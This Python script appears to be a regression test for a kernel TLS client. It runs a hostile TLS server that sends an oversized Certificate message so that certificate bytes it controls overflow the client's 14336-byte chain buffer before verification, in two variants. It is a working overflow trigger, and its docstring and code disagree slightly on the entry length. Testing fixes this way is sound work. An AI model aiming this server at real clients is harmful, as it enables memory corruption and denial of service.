#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 cubestudio-dev <cubestudio@qq.com>
"""P0fix3 hostile TLS server -- BUG-0024 residual (A14-18 chain_buf
accumulation bound).

  --case a18_chain_wrap  After the kernel TLS client's ClientHello, send
      a minimal TLS 1.2 ServerHello (cipher 0x0067, no
      supported_versions), then a Certificate handshake message whose
      total length is 0x4000 (16384) and whose FIRST chain entry
      declares dlen = 0x3FFD (16381). The P0fix2 fix enlarged `body` to
      18432, so `mlen` now passes every mlen-side check; the chain
      split loop only checked `used` at iteration entry, so the first
      memcpy wrote 16381 bytes into the 14336-byte chain_buf - 2045
      bytes past the buffer, pre-verification, with fully
      attacker-controlled certificate bytes. A fixed kernel must refuse
      the handshake (the chain cannot be verified) and stay alive.

  --case a18_chain_multi  Same, but as four ~4.5KB entries (each
      individually under 14336 but totalling 18KB) to cover the
      accumulation path: `used` starts under the cap at every iteration
      entry, only `used + dlen` crosses it.
"""
import argparse
import socket
import time


def recv_exact(conn, n):
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def read_tls_record(conn):
    hdr = recv_exact(conn, 5)
    if hdr is None:
        return None
    ln = (hdr[3] << 8) | hdr[4]
    body = recv_exact(conn, ln) if ln else b""
    return hdr + (body or b"")


def tls12_server_hello():
    body = bytes([3, 3]) + bytes(32) + bytes([0]) + bytes([0x00, 0x67]) + bytes([0, 0, 0])
    hs = bytes([2]) + len(body).to_bytes(3, "big") + body
    return bytes([0x16, 3, 3]) + len(hs).to_bytes(2, "big") + hs


def cert_msg(mlen, dlens):
    """Certificate handshake message: type(1) + mlen(3) + chain_total(3)
    + entries (3-byte length + body each). The entries section is
    padded with trailing bytes so the message body is exactly mlen
    (the kernel checks `mlen + 4 > payload`)."""
    entries = b""
    for d in dlens:
        entries += d.to_bytes(3, "big") + b"\x41" * d   # visible filler
    entries_sum = len(entries)
    if entries_sum > mlen - 3:
        raise ValueError("entries do not fit under mlen")
    body = mlen.to_bytes(3, "big") + entries + bytes(mlen - 3 - entries_sum)
    assert len(body) == mlen
    return bytes([0x0B]) + mlen.to_bytes(3, "big") + body


def serve(case, port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    print(f"[evil-tls] case {case} listening on :{port}", flush=True)
    srv.settimeout(240)
    try:
        conn, _ = srv.accept()
    except socket.timeout:
        print("[evil-tls] no client connected", flush=True)
        return
    conn.settimeout(60)
    try:
        ch = read_tls_record(conn)
        print(f"[evil-tls] got ClientHello {len(ch or b'')} bytes", flush=True)
        if not ch:
            return
        conn.sendall(tls12_server_hello())
        print("[evil-tls] sent TLS1.2 ServerHello", flush=True)
        time.sleep(1)
        if case == "a18_chain_wrap":
            msg = cert_msg(16384, [16378])
            print("[evil-tls] Certificate mlen=16384 first dlen=16378 "
                  "(> chain_buf 14336 by 2042)", flush=True)
        else:  # a18_chain_multi
            msg = cert_msg(16384, [4100, 4100, 4100, 4069])
            print("[evil-tls] Certificate mlen=16384 as 4 entries "
                  "(4100+4100+4100+4069 = 16369; crosses 14336 only in "
                  "accumulation)", flush=True)
        # the kernel TLS 1.2 path requires the whole Certificate message
        # inside ONE record (mlen + 4 <= record payload): 16388 <= 18432
        rec = bytes([0x16, 3, 3]) + len(msg).to_bytes(2, "big") + msg
        conn.sendall(rec)
        print(f"[evil-tls] sent {len(msg)}-byte Certificate in one record", flush=True)
        time.sleep(10)
        conn.settimeout(10)
        try:
            while True:
                d = conn.recv(4096)
                if not d:
                    break
        except socket.timeout:
            pass
    except (ConnectionResetError, BrokenPipeError, socket.timeout) as e:
        print(f"[evil-tls] connection ended: {e}", flush=True)
    finally:
        conn.close()
        srv.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--case", required=True, choices=["a18_chain_wrap", "a18_chain_multi"])
    ap.add_argument("--port", type=int, default=8553)
    args = ap.parse_args()
    serve(args.case, args.port)


if __name__ == "__main__":
    main()
